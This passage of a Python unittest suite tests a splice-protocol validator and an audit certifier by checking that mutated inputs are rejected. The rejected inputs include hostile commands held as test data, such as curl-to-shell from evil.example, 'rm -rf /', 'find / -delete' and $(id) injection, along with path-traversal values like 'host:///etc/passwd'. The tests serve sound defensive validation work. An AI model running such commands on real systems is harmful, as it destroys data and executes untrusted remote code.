            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("vendor.splices.bounded_ratchet_gate.core:gate"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("from vendor.splices.bounded_ratchet_gate.core import gate"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("from vendor.splices.bounded_ratchet_gate import core"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("from vendor . splices . bounded_ratchet_gate import core"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("import vendor . splices . bounded_ratchet_gate . core"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("from vendor.splices.bounded_ratchet_gate import x, core as c"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("from vendor.splices.bounded_ratchet_gate import *"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("importlib.import_module('vendor.splices.bounded_ratchet_gate.core')"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append('open("vendor/splices/bounded_ratchet_gate/core/gate.py")'), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("vendor/splices/x/../bounded_ratchet_gate/core/gate.py"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("vendor\\splices\\bounded_ratchet_gate\\core\\gate.py"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("../vendor/splices/bounded_ratchet_gate/core/gate.py"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["core_files_sha256_after_lock"].__setitem__("vendor/splices/bounded_ratchet_gate/core/gate.py", "f" * 64), "IMMUTABLE_CORE_MUTATED"),
            (lambda x: x["host_files_touched"].append("extra.py"), "HOST_TOUCH_BUDGET_OR_SEAM_BREACH"),
            (lambda x: x.__setitem__("host_files_touched", ["tests/test_bounded_ratchet_seam.py"]), "HOST_TOUCH_BUDGET_OR_SEAM_BREACH"),
            (lambda x: x.__setitem__("lock_exit_code", 1), "LOCK_CONTRACT_TEST_FAILED"),
            (lambda x: x.__setitem__("ejection_build_ok", False), "CLEAN_EJECTION_FAILED"),
            (lambda x: x.__setitem__("vendor_dir_is_symlink", True), "VENDOR_SYMLINK_FORBIDDEN"),
            (lambda x: x["airlock_envelope_keys"].append("zone_a_transcript"), "AIRLOCK_ZONE_A_LEAKAGE_BREACH"),
            (lambda x: x["airlock_envelope_keys"].append("ZONE_A_TRANSCRIPT"), "AIRLOCK_ZONE_A_LEAKAGE_BREACH"),
            (lambda x: x.__setitem__("verifier_zone_a_board_read_access", True), "AIRLOCK_ZONE_A_LEAKAGE_BREACH"),
        ):
            mm, ee = _valid_splice_pair()
            mut(ee)
            res = oracle.validate_splicer_graft(mm, ee)
            self.assertFalse(res["compliant"])
            self.assertIn(expected_code, res["violations"])

        # Every manifest & execution structural _require refusal (isolated per conjunct!)
        def assert_m_refused(mut_m, mut_e, err: str) -> None:
            mm, ee = _valid_splice_pair()
            if mut_m:
                mut_m(mm)
            if mut_e:
                mut_e(ee)
            with self.assertRaisesRegex(CordatAuditError, err):
                oracle.validate_splicer_graft(mm, ee)

        with self.assertRaisesRegex(CordatAuditError, "splice-dicts"):
            oracle.validate_splicer_graft("bad", e)  # type: ignore[arg-type]
        with self.assertRaisesRegex(CordatAuditError, "splice-dicts"):
            oracle.validate_splicer_graft(m, "bad")  # type: ignore[arg-type]

        assert_m_refused(lambda x: x.__setitem__("extra", 1), None, "splice-top-keys-exact")
        assert_m_refused(lambda x: x.__setitem__("splice_version", "0.2.0"), None, "splice-version")
        assert_m_refused(lambda x: x.__setitem__("capability", "BAD CAP"), None, "splice-capability-slug")
        assert_m_refused(lambda x: x.__setitem__("donor", "bad"), None, "splice-donor-keys")
        assert_m_refused(lambda x: x["donor"].__setitem__("extra", 1), None, "splice-donor-keys")
        assert_m_refused(lambda x: x["donor"].__setitem__("uri", "http://insecure.example/x"), None, "splice-donor-https")
        assert_m_refused(lambda x: x["donor"].__setitem__("uri", "https://"), None, "splice-donor-https")
        assert_m_refused(lambda x: x["donor"].__setitem__("uri", "https://github.com:0/Moissanite-Labs/weft"), None, "splice-donor-port")
        assert_m_refused(lambda x: x["donor"].__setitem__("uri", "https://github.com:65536/Moissanite-Labs/weft"), None, "splice-donor-port")
        assert_m_refused(lambda x: x["donor"].__setitem__("commit", "short"), None, "splice-donor-commit-sha1")
        assert_m_refused(lambda x: x["donor"].__setitem__("license", "PROPRIETARY"), None, "splice-donor-license")
        assert_m_refused(lambda x: x["donor"].__setitem__("entry_symbols", "bad"), None, "splice-entry-symbols-nonempty")
        assert_m_refused(lambda x: x["donor"].__setitem__("entry_symbols", []), None, "splice-entry-symbols-nonempty")
        assert_m_refused(lambda x: x["donor"].__setitem__("entry_symbols", ["A", "A"]), None, "splice-entry-symbols-unique")
        assert_m_refused(lambda x: x.__setitem__("severance_map", "bad"), None, "splice-sev-map-dict")
        assert_m_refused(lambda x: x["severance_map"].__setitem__("x", "npm://evil"), None, "splice-sev-target")
        assert_m_refused(lambda x: x["severance_map"].__setitem__("x", "host://"), None, "splice-sev-target")
        assert_m_refused(lambda x: x["severance_map"].__setitem__("x", "stdlib://"), None, "splice-sev-target")
        assert_m_refused(lambda x: x["severance_map"].__setitem__("x", "host:///etc/passwd"), None, "splice-sev-target")
        assert_m_refused(lambda x: x["severance_map"].__setitem__("x", "host://../escape"), None, "splice-sev-target")
        assert_m_refused(lambda x: x["severance_map"].__setitem__("x", "host://."), None, "splice-sev-target")
        assert_m_refused(lambda x: x["severance_map"].__setitem__("x", "host://a/./b"), None, "splice-sev-target")
        assert_m_refused(lambda x: x["severance_map"].__setitem__("x", "stdlib://."), None, "splice-sev-target")
        assert_m_refused(lambda x: x.__setitem__("seam", "bad"), None, "splice-seam-keys")
        assert_m_refused(lambda x: x["seam"].__setitem__("extra", 1), None, "splice-seam-keys")
        assert_m_refused(lambda x: x["seam"].__setitem__("path", "/abs/path.py"), None, "unsafe-relpath")
        assert_m_refused(lambda x: x["seam"].__setitem__("path", "a\\b.py"), None, "unsafe-relpath")
        assert_m_refused(lambda x: x["seam"].__setitem__("path", "a/../b.py"), None, "unsafe-relpath")
        assert_m_refused(lambda x: x["seam"].__setitem__("path", "vendor/splices/x/seam.py"), None, "splice-seam-outside-vendor")
        assert_m_refused(lambda x: x["seam"].__setitem__("exports", "bad"), None, "splice-seam-exports-nonempty")
        assert_m_refused(lambda x: x["seam"].__setitem__("exports", []), None, "splice-seam-exports-nonempty")
        assert_m_refused(lambda x: x["seam"].__setitem__("exports", ["f", "f"]), None, "splice-seam-exports-unique")
        assert_m_refused(lambda x: x.__setitem__("verification", "bad"), None, "splice-verif-keys")
        assert_m_refused(lambda x: x["verification"].__setitem__("extra", 1), None, "splice-verif-keys")
        for bad_cmd in (
            " ".join(("npx", "-y", "evil-pkg")),
            " ".join(("rm", "-rf", '"$DIR"')),
            " ".join(("rm", "-rf", "/")),
            " ".join(("rm", "-r", "-f", "/")),
            " ".join(("rm", "-f", "-r", "/")),
            " ".join(("rm", "/", "-rf")),
            " ".join(("/bin/rm", "-r", "-f", "/tmp/x")),
            " ".join(("rm", "-r", "/")),
            " ".join(("curl", "https://evil.example/x", "|", "sh")),
            " ".join(("curl", "https://evil.example/x|sh")),
            " ".join(("curl", "https://evil.example/x", "|", "/bin/sh")),
            " ".join(("curl", "https://evil.example/x", "|", "/usr/bin/bash")),
            " ".join(("curl", "https://evil.example/x", "|", "python3")),
            " ".join(("curl", "https://evil.example/x", "|", "perl")),
            " ".join(("find", "/", "-delete")),
            " ".join(("git", "clean", "-fdx")),
            " ".join(("git", "clean", "--force")),
            " ".join(("sh", "-c", "'rm -rf /tmp/x'")),
            " ".join(("bash", "-lc", "'echo hi'")),
            " ".join(("python3", "-c", "'import os'")),
            " ".join(("perl", "-e", "'unlink'")),
            " ".join(("node", "-e", "'process.exit()'")),
            "echo $(" + "id)",
            "echo " + chr(96) + "id" + chr(96),
            "sudo pytest",
        ):
            assert_m_refused(lambda x, c=bad_cmd: x["verification"].__setitem__("command", c), None, "splice-verif-cmd-unsafe")
        assert_m_refused(lambda x: x["verification"].__setitem__("max_host_files_touched", 0), None, "splice-max-host-files-pos")

        assert_m_refused(None, lambda x: x.__setitem__("zone_a_transcript", "leaked"), "splice-exec-keys-exact")

        assert_m_refused(None, lambda x: x.__setitem__("states_executed", "bad"), "splice-states-list")
        assert_m_refused(None, lambda x: x.__setitem__("probe_foreign_imports", "bad"), "splice-foreign-imports-list")
        assert_m_refused(None, lambda x: x.__setitem__("lockfiles_before_sha256", "bad"), "splice-lockfiles-dicts")
        assert_m_refused(None, lambda x: x.__setitem__("lockfiles_after_sha256", "bad"), "splice-lockfiles-dicts")
        assert_m_refused(None, lambda x: x["lockfiles_before_sha256"].__setitem__("pyproject.toml", "not-a-sha256"), "splice-lockfiles_before-hash-fmt")
        assert_m_refused(None, lambda x: x["lockfiles_after_sha256"].__setitem__("pyproject.toml", "not-a-sha256"), "splice-lockfiles_after-hash-fmt")
        assert_m_refused(None, lambda x: x.__setitem__("host_imports_by_file", "bad"), "splice-host-imports-dict")
        assert_m_refused(None, lambda x: x.__setitem__("core_files_sha256_after_extract", "bad"), "splice-core-hashes-dicts")
        assert_m_refused(None, lambda x: x.__setitem__("core_files_sha256_after_extract", {}), "splice-core-hashes-dicts")
        assert_m_refused(None, lambda x: x.__setitem__("core_files_sha256_after_lock", "bad"), "splice-core-hashes-dicts")
        assert_m_refused(None, lambda x: x.__setitem__("core_files_sha256_after_extract", {"aletheia/outside_core.py": "2" * 64}), "splice-core_extract-under-core")
        assert_m_refused(None, lambda x: x.__setitem__("core_files_sha256_after_lock", {"aletheia/outside_core.py": "2" * 64}), "splice-core_lock-under-core")
        assert_m_refused(None, lambda x: x["core_files_sha256_after_extract"].__setitem__("vendor/splices/bounded_ratchet_gate/core/g.py", "not-sha"), "splice-core_extract-hash-fmt")
        assert_m_refused(None, lambda x: x["core_files_sha256_after_lock"].__setitem__("vendor/splices/bounded_ratchet_gate/core/g.py", "not-sha"), "splice-core_lock-hash-fmt")
        assert_m_refused(None, lambda x: x.__setitem__("host_files_touched", "bad"), "splice-host-touched-list")
        assert_m_refused(None, lambda x: x.__setitem__("airlock_envelope_keys", "bad"), "splice-airlock-keys-nonempty")
        assert_m_refused(None, lambda x: x.__setitem__("airlock_envelope_keys", []), "splice-airlock-keys-nonempty")
        assert_m_refused(None, lambda x: x.__setitem__("verifier_zone_a_board_read_access", 0), "exact-bool:splice.verifier_zone_a_board_read_access")
        assert_m_refused(None, lambda x: x["host_imports_by_file"].__setitem__("a.py", "not-list"), "host_imports.list")


class TestCertifierConservationR5(unittest.TestCase):
    """Kill EVERY single conservation, boundary, violation, and conjunct mutant in certifier."""

    def test_valid_extreme_boundaries(self) -> None:
        # 1. Exact baseline passes
        p, inv = _valid_cert_inputs()
        self.assertTrue(oracle.certify_siliconcordat_d5_audit(p, inv)["certified"])

        # 2. Exact tight boundary values:
        #    top_c=1, reps=0, md_l=1, all 5 exact defect keys 0; r91 calm == peak == 19/20;
        #    ah_ok k=2, u=0, el=0 (with gate_passed=False); rt dim=1, tot_s=1, com_c=0, rol_c=1 (genuine BUDGET_EXCEEDED),
        #    spent=0/1, f_drift=0/1, f_best=4/5; sp_ok touched == 1 == max_touched!
        p2, inv2 = _valid_cert_inputs()
        p2.update({
            "top_level_comments": 1, "replies": 0, "total_entries_incl_op": 2,
            "markdown_line_count": 1,
            "pseudocode_defect_counts": {k: 0 for k in p2["pseudocode_defect_counts"]},
            "pseudocode_defect_total": 0,
        })
        inv2["reply91_decay_refutation"].update({
            "law2b_bounded_mult_at_calm": "19/20", "law2b_bounded_mult_at_peak": "19/20", "law2b_strictly_stable": True,
        })
        inv2["invariant_a_anti_homogenization"]["diverse_with_rogue_outlier_blocked"].update({
            "cohort_size": 2, "distinct_vectors": 0, "eligible_count": 0,
            "gate_passed": False, "selected_candidate_id": None,
            "cluster_renyi2": "1/1", "effective_diversity_d2": "1/1",
        })
        inv2["invariant_b_monotone_ratchet"]["trace_witness"].update({
            "dim": 1, "total_steps": 1, "committed_count": 0, "rollback_count": 1,
            "total_spent": "0/1", "final_drift_sq": "0/1", "final_best_behavior": "4/5",
            "final_committed_weights": ["0/1"],
            "trace": [{
                "step_id": "s1", "cost": "11/1", "cumulative_spent": "0/1",
                "candidate_drift_sq": "0/1", "behavior_score": "1/1",
                "committed": False, "edge_snapped": True, "active_equals_committed": True,
                "rejection_reasons": ["BUDGET_EXCEEDED"],
            }],
        })
        inv2["invariant_c_splicer_protocol"]["compliant_graft_witness"].update({
            "non_vendor_host_files_touched": 1, "max_host_files_touched": 1,
        })
        g2 = oracle.certify_siliconcordat_d5_audit(p2, inv2)
        self.assertFalse(g2["certified"])
        self.assertEqual(g2["violations"], ["INVARIANT_A_CONTROLS_FAILED", "INVARIANT_B_CONTROLS_FAILED"])

        # Boundary: com_c=1, rol_c=0, spent == b_max, f_drift == r_sq, beh == b_floor (and second step beh == best_beh),
        #           cg_fd == cg_r, ah_ok_u == ah_ok_el == ah_ok_k == 2, sp_ok_t == sp_ok_m, non-monotone mode allowed!
        p3, inv3 = _valid_cert_inputs()
        inv3["invariant_a_anti_homogenization"]["diverse_with_rogue_outlier_blocked"].update({
            "cohort_size": 2, "distinct_vectors": 2, "eligible_count": 2,
        })
        inv3["invariant_b_monotone_ratchet"]["trace_witness"].update({
            "total_steps": 2, "committed_count": 2, "rollback_count": 0,
            "total_spent": "10/1", "final_drift_sq": "16/1", "final_best_behavior": "4/5",
            "final_committed_weights": ["4/1", "0/1"],
            "trace": [
                {
                    "step_id": "s1", "cost": "5/1", "cumulative_spent": "5/1",
                    "candidate_drift_sq": "16/1", "behavior_score": "4/5",
                    "committed": True, "edge_snapped": False, "active_equals_committed": True,
                    "rejection_reasons": [],
                },
                {
                    "step_id": "s2", "cost": "5/1", "cumulative_spent": "10/1",
                    "candidate_drift_sq": "16/1", "behavior_score": "4/5",
                    "committed": True, "edge_snapped": False, "active_equals_committed": True,
                    "rejection_reasons": [],
                },
            ],
        })
        inv3["invariant_b_monotone_ratchet"]["calibration_gap_witness"].update({
            "flip_drift_sq": "16/1", "drift_ratio_perm_over_flip": "11/4",
        })
        inv3["invariant_c_splicer_protocol"]["compliant_graft_witness"]["non_vendor_host_files_touched"] = 2
        g3 = oracle.certify_siliconcordat_d5_audit(p3, inv3)
        self.assertFalse(g3["certified"])
        self.assertEqual(g3["violations"], ["INVARIANT_B_CONTROLS_FAILED"])

        # Non-monotone valid trace (beh drops from 9/10 to 4/5 >= b_floor with require_monotone_behavior=False!)
        p3b, inv3b = _valid_cert_inputs()
        inv3b["invariant_b_monotone_ratchet"]["trace_witness"].update({
            "require_monotone_behavior": False, "total_steps": 3, "committed_count": 2, "rollback_count": 1,
            "total_spent": "3/1", "final_drift_sq": "2/1", "final_best_behavior": "9/10",
            "final_committed_weights": ["1/1", "1/1"],
            "trace": [
                {
                    "step_id": "s1", "cost": "1/1", "cumulative_spent": "1/1",
                    "candidate_drift_sq": "1/1", "behavior_score": "9/10",
                    "committed": True, "edge_snapped": False, "active_equals_committed": True,
                    "rejection_reasons": [],
                },
                {
                    "step_id": "s2", "cost": "1/1", "cumulative_spent": "2/1",
                    "candidate_drift_sq": "2/1", "behavior_score": "4/5",
                    "committed": True, "edge_snapped": False, "active_equals_committed": True,
                    "rejection_reasons": [],
                },
                {
                    "step_id": "s3", "cost": "1/1", "cumulative_spent": "3/1",
                    "candidate_drift_sq": "17/1", "behavior_score": "9/10",
                    "committed": False, "edge_snapped": True, "active_equals_committed": True,
                    "rejection_reasons": ["NORM_RADIUS_EXCEEDED"],
                },
            ],
        })
        self.assertTrue(oracle.certify_siliconcordat_d5_audit(p3b, inv3b)["certified"])

        # Tight zero flip_drift_sq == 0/1 & zero perm_drift_sq == 0/1 (ratio="INF", pfr=False, ffa=True, proved=False)
        p4, inv4 = _valid_cert_inputs()
        inv4["invariant_b_monotone_ratchet"]["calibration_gap_witness"].update({
            "flip_drift_sq": "0/1", "perm_drift_sq": "0/1",
            "perm_norm_only_falsely_rejects": False, "flip_norm_only_falsely_accepts": True,
            "drift_ratio_perm_over_flip": "INF", "calibration_gap_proved": False,
        })
        g4 = oracle.certify_siliconcordat_d5_audit(p4, inv4)
        self.assertFalse(g4["certified"])
        self.assertEqual(g4["violations"], ["INVARIANT_B_CONTROLS_FAILED"])

        # Tight perm_drift_sq == radius_sq (16/1 -> pfr=False) and flip_drift_sq > radius_sq (17/1 -> ffa=False)
        p4b, inv4b = _valid_cert_inputs()
        inv4b["invariant_b_monotone_ratchet"]["calibration_gap_witness"].update({
            "perm_drift_sq": "16/1", "perm_norm_only_falsely_rejects": False,
            "drift_ratio_perm_over_flip": "2/1", "calibration_gap_proved": False,
        })
        self.assertEqual(oracle.certify_siliconcordat_d5_audit(p4b, inv4b)["violations"], ["INVARIANT_B_CONTROLS_FAILED"])

        p4c, inv4c = _valid_cert_inputs()
        inv4c["invariant_b_monotone_ratchet"]["calibration_gap_witness"].update({
            "flip_drift_sq": "17/1", "flip_norm_only_falsely_accepts": False,
            "drift_ratio_perm_over_flip": "44/17", "calibration_gap_proved": False,
        })
        self.assertEqual(oracle.certify_siliconcordat_d5_audit(p4c, inv4c)["violations"], ["INVARIANT_B_CONTROLS_FAILED"])

    def test_every_certifier_refusal_and_violation(self) -> None:
        p0, inv0 = _valid_cert_inputs()
        with self.assertRaisesRegex(CordatAuditError, "cert-dicts"):
            oracle.certify_siliconcordat_d5_audit("bad", inv0)  # type: ignore[arg-type]
        with self.assertRaisesRegex(CordatAuditError, "cert-dicts"):
            oracle.certify_siliconcordat_d5_audit(p0, "bad")  # type: ignore[arg-type]

        def assert_refused(mut, err: str) -> None:
            p, inv = _valid_cert_inputs()
            mut(p, inv)
            with self.assertRaisesRegex(CordatAuditError, err):
                oracle.certify_siliconcordat_d5_audit(p, inv)

        # Top-level & portal exact-key & conservation refusals (0 KeyErrors on missing keys!)
        assert_refused(lambda p, i: p.__setitem__("extra", 1), "portal-keys-exact")
        assert_refused(lambda p, i: p.pop("replies"), "portal-keys-exact")
        assert_refused(lambda p, i: i.__setitem__("extra", 1), "invariants-keys-exact")
        assert_refused(lambda p, i: i.pop("reply91_decay_refutation"), "invariants-keys-exact")
        assert_refused(lambda p, i: p.__setitem__("pseudocode_defect_counts", "bad"), "portal.defects-keys-exact")
        assert_refused(lambda p, i: p.__setitem__("pseudocode_defect_counts", {}), "portal.defects-keys-exact")
        assert_refused(lambda p, i: p["pseudocode_defect_counts"].__setitem__("extra", 0), "portal.defects-keys-exact")
        assert_refused(lambda p, i: p.update({"top_level_comments": 0, "total_entries_incl_op": 21}), "portal-entry-conservation")
        assert_refused(lambda p, i: p.update({"replies": -1, "total_entries_incl_op": 11}), "portal-entry-conservation")
        assert_refused(lambda p, i: p.__setitem__("total_entries_incl_op", 99), "portal-entry-conservation")
        assert_refused(lambda p, i: p.__setitem__("markdown_line_count", 0), "portal-entry-conservation")
        assert_refused(lambda p, i: (p["pseudocode_defect_counts"].__setitem__("comment11_uninitialized_mov_cr3_rax", -1), p["pseudocode_defect_counts"].__setitem__("reply91_symp_matrix_scalar_overwrite", 7)), "portal-defect-sum")
        assert_refused(lambda p, i: p.__setitem__("pseudocode_defect_total", 99), "portal-defect-sum")

        # Reply 9.1 exact-key & exact-formula refusals
        assert_refused(lambda p, i: i.__setitem__("reply91_decay_refutation", "bad"), "r91-keys-exact")
        assert_refused(lambda p, i: i["reply91_decay_refutation"].__setitem__("extra", 1), "r91-keys-exact")
        assert_refused(lambda p, i: i["reply91_decay_refutation"].__setitem__("base_decay", "0/1"), "r91-params-range")
        assert_refused(lambda p, i: i["reply91_decay_refutation"].__setitem__("calm_tension", "-1/1"), "r91-params-range")
        assert_refused(lambda p, i: i["reply91_decay_refutation"].__setitem__("eps", "0/1"), "r91-params-range")
        assert_refused(lambda p, i: i["reply91_decay_refutation"].__setitem__("d5_reply91_pressure", "1/1"), "r91-formula-match")
        assert_refused(lambda p, i: i["reply91_decay_refutation"].__setitem__("d5_reply91_multiplier", "-1/1"), "r91-formula-match")
        assert_refused(lambda p, i: i["reply91_decay_refutation"].__setitem__("d5_reply91_multiplier_dec4", "-1.0000"), "r91-formula-match")
        assert_refused(lambda p, i: i["reply91_decay_refutation"].__setitem__("law2b_bounded_mult_at_calm", "1/2"), "r91-formula-match")
        assert_refused(lambda p, i: i["reply91_decay_refutation"].__setitem__("d5_reply91_sign_flip_blowup", False), "r91-blowup-match")
        assert_refused(lambda p, i: i["reply91_decay_refutation"].__setitem__("law2b_strictly_stable", False), "r91-safe-match")

        # Invariant A exact-key & veto allowlist refusals
        assert_refused(lambda p, i: i.__setitem__("invariant_a_anti_homogenization", "bad"), "inv_a-keys-exact")
        assert_refused(lambda p, i: i["invariant_a_anti_homogenization"].__setitem__("extra", 1), "inv_a-keys-exact")
        assert_refused(lambda p, i: i["invariant_a_anti_homogenization"].__setitem__("diverse_with_rogue_outlier_blocked", "bad"), "inv_a-subdicts")
        assert_refused(lambda p, i: i["invariant_a_anti_homogenization"]["diverse_with_rogue_outlier_blocked"].__setitem__("extra", 1), "inv_a-subdicts")
        assert_refused(lambda p, i: i["invariant_a_anti_homogenization"].__setitem__("monoculture_echo_chamber_vetoed", "bad"), "inv_a-subdicts")
        assert_refused(lambda p, i: i["invariant_a_anti_homogenization"]["monoculture_echo_chamber_vetoed"].__setitem__("extra", 1), "inv_a-subdicts")
        ah = lambda i: i["invariant_a_anti_homogenization"]["diverse_with_rogue_outlier_blocked"]
        ahb = lambda i: i["invariant_a_anti_homogenization"]["monoculture_echo_chamber_vetoed"]
        assert_refused(lambda p, i: ah(i).update({"cohort_size": 1, "distinct_vectors": 1, "eligible_count": 1}), "ah-ok-counts")
        assert_refused(lambda p, i: ah(i).__setitem__("eligible_count", -1), "ah-ok-counts")
        assert_refused(lambda p, i: ah(i).__setitem__("eligible_count", 9), "ah-ok-counts")
        assert_refused(lambda p, i: ah(i).__setitem__("distinct_vectors", -1), "ah-ok-counts")
        assert_refused(lambda p, i: ah(i).__setitem__("distinct_vectors", 3), "ah-ok-counts")
        assert_refused(lambda p, i: ah(i).update({"cluster_renyi2": "2/1", "effective_diversity_d2": "1/2"}), "ah-ok-renyi-inv")
        assert_refused(lambda p, i: ah(i).__setitem__("effective_diversity_d2", "9/1"), "ah-ok-renyi-inv")
        assert_refused(lambda p, i: ah(i).__setitem__("selected_candidate_id", "cand-rogue-outlier"), "ah-rogue-blocked")
        assert_refused(lambda p, i: ah(i).__setitem__("zone", "ZONE_B"), "ah-zone-a-unverified-tag:ah_ok")
        assert_refused(lambda p, i: ah(i).__setitem__("epistemic_tag", "VERIFIED"), "ah-zone-a-unverified-tag:ah_ok")
        assert_refused(lambda p, i: ah(i).__setitem__("diversity_scope", "ALL_CANDIDATES"), "ah-zone-a-unverified-tag:ah_ok")
        assert_refused(lambda p, i: ahb(i).__setitem__("zone", "ZONE_B"), "ah-zone-a-unverified-tag:ah_bad")
        assert_refused(lambda p, i: ahb(i).__setitem__("epistemic_tag", "VERIFIED"), "ah-zone-a-unverified-tag:ah_bad")
        assert_refused(lambda p, i: ahb(i).__setitem__("diversity_scope", "ALL_CANDIDATES"), "ah-zone-a-unverified-tag:ah_bad")
        assert_refused(lambda p, i: ah(i).__setitem__("selected_candidate_id", ""), "clean-ascii:ah_ok.selected_candidate_id")
        assert_refused(lambda p, i: ah(i).__setitem__("selected_candidate_id", None), "clean-ascii:ah_ok.selected_candidate_id")
        assert_refused(lambda p, i: ah(i).update({"eligible_count": 1, "distinct_vectors": 1}), "ah-ok-pass-consistency")
        assert_refused(lambda p, i: ah(i).__setitem__("distinct_vectors", 1), "ah-ok-pass-consistency")
        assert_refused(lambda p, i: ah(i).update({"cluster_renyi2": "1/1", "effective_diversity_d2": "1/1"}), "ah-ok-pass-consistency")
        assert_refused(lambda p, i: ah(i).__setitem__("veto_reasons", ["x"]), "ah-ok-pass-consistency")
        assert_refused(lambda p, i: ahb(i).__setitem__("veto_reasons", "bad"), "ah-bad-veto-consistency")
        assert_refused(lambda p, i: ahb(i).__setitem__("veto_reasons", []), "ah-bad-veto-consistency")
        assert_refused(lambda p, i: ahb(i).__setitem__("selected_candidate_id", "clone-1"), "ah-bad-veto-consistency")
        assert_refused(lambda p, i: ahb(i).__setitem__("veto_reasons", ["FORGED_CODE"]), "ah-bad-veto-codes")
        assert_refused(
            lambda p, i: ahb(i).__setitem__("veto_reasons", ["MONOCULTURE_COHORT_SPREAD_BELOW_MIN", "MONOCULTURE_COHORT_SPREAD_BELOW_MIN"]),
            "ah-bad-veto-codes",
        )

        # Invariant B exact-key, semantic ratchet replay, & calibration-gap refusals
        assert_refused(lambda p, i: i.__setitem__("invariant_b_monotone_ratchet", "bad"), "inv_b-keys-exact")
        assert_refused(lambda p, i: i["invariant_b_monotone_ratchet"].__setitem__("extra", 1), "inv_b-keys-exact")
        assert_refused(lambda p, i: i["invariant_b_monotone_ratchet"].__setitem__("trace_witness", "bad"), "inv_b-subdicts")
        assert_refused(lambda p, i: i["invariant_b_monotone_ratchet"]["trace_witness"].__setitem__("extra", 1), "inv_b-subdicts")
        assert_refused(lambda p, i: i["invariant_b_monotone_ratchet"].__setitem__("calibration_gap_witness", "bad"), "inv_b-subdicts")
        assert_refused(lambda p, i: i["invariant_b_monotone_ratchet"]["calibration_gap_witness"].__setitem__("extra", 1), "inv_b-subdicts")
        rt = lambda i: i["invariant_b_monotone_ratchet"]["trace_witness"]
        cg = lambda i: i["invariant_b_monotone_ratchet"]["calibration_gap_witness"]
        assert_refused(lambda p, i: rt(i).__setitem__("dim", 0), "rt-dim-pos")
        assert_refused(lambda p, i: rt(i).__setitem__("final_committed_weights", tuple(rt(i)["final_committed_weights"])), "rt-final-weights-dim")
        assert_refused(lambda p, i: rt(i).__setitem__("final_committed_weights", ["1/1"]), "rt-final-weights-dim")
        assert_refused(lambda p, i: rt(i).__setitem__("final_committed_weights", ["bad", "1/1"]), "frac-str:rt.final_committed_weights")
        assert_refused(lambda p, i: rt(i).__setitem__("radius_sq", "0/1"), "rt-pos-limits")
        assert_refused(lambda p, i: rt(i).__setitem__("budget_max", "0/1"), "rt-pos-limits")
        assert_refused(lambda p, i: rt(i).update({"total_steps": 0, "committed_count": 0, "rollback_count": 0, "trace": []}), "rt-step-conservation")
        assert_refused(lambda p, i: rt(i).update({"committed_count": -1, "rollback_count": 6}), "rt-step-conservation")
        assert_refused(lambda p, i: rt(i).update({"committed_count": 6, "rollback_count": -1}), "rt-step-conservation")
        assert_refused(lambda p, i: rt(i).__setitem__("committed_count", 1), "rt-step-conservation")
        assert_refused(lambda p, i: rt(i).__setitem__("trace", tuple(rt(i)["trace"])), "rt-trace-len")
        assert_refused(lambda p, i: rt(i).__setitem__("trace", []), "rt-trace-len")
        assert_refused(lambda p, i: rt(i)["trace"].__setitem__(0, "not-a-dict"), "rt-trace-row-keys")
        assert_refused(lambda p, i: rt(i)["trace"][0].__setitem__("extra", 1), "rt-trace-row-keys")
        assert_refused(lambda p, i: rt(i)["trace"][1].__setitem__("step_id", rt(i)["trace"][0]["step_id"]), "rt-trace-dup-step")
        assert_refused(lambda p, i: rt(i)["trace"][0].__setitem__("cost", "0/1"), "rt-trace-cost-pos")
        assert_refused(lambda p, i: rt(i)["trace"][0].__setitem__("candidate_drift_sq", "-1/1"), "rt-trace-drift-nonneg")
        assert_refused(lambda p, i: rt(i)["trace"][0].__setitem__("rejection_reasons", "bad"), "rt-trace-rej-list")
        assert_refused(lambda p, i: rt(i)["trace"][0].__setitem__("active_equals_committed", False), "rt-trace-row-conservation")
        assert_refused(lambda p, i: rt(i)["trace"][0].__setitem__("edge_snapped", True), "rt-trace-row-conservation")
        # Semantic replay checks (kills forged BUDGET_EXCEEDED, forged committed breach, forged rollback, regression, etc.)
        assert_refused(lambda p, i: rt(i)["trace"][0].__setitem__("rejection_reasons", ["FORGED_REASON"]), "rt-trace-semantic-match")
        assert_refused(lambda p, i: rt(i)["trace"][0].update({"committed": False, "edge_snapped": True}), "rt-trace-semantic-match")
        assert_refused(lambda p, i: rt(i)["trace"][0].__setitem__("candidate_drift_sq", "17/1"), "rt-trace-semantic-match")
        assert_refused(lambda p, i: rt(i)["trace"][0].__setitem__("behavior_score", "1/2"), "rt-trace-semantic-match")
        assert_refused(lambda p, i: rt(i)["trace"][3].__setitem__("behavior_score", "4/5"), "rt-trace-semantic-match")
        assert_refused(lambda p, i: rt(i)["trace"][1].__setitem__("rejection_reasons", []), "rt-trace-semantic-match")
        assert_refused(lambda p, i: rt(i)["trace"][1].__setitem__("rejection_reasons", ["BUDGET_EXCEEDED"]), "rt-trace-semantic-match")
        assert_refused(lambda p, i: rt(i)["trace"][0].__setitem__("cumulative_spent", "99/1"), "rt-trace-cum-spent")
        assert_refused(lambda p, i: rt(i).update({"committed_count": 3, "rollback_count": 2}), "rt-trace-count-match")
        assert_refused(lambda p, i: rt(i).__setitem__("total_spent", "8/1"), "rt-trace-count-match")
        assert_refused(
            lambda p, i: rt(i).update({"final_drift_sq": "2/1", "final_committed_weights": ["1/1", "1/1"]}),
            "rt-trace-count-match",
        )
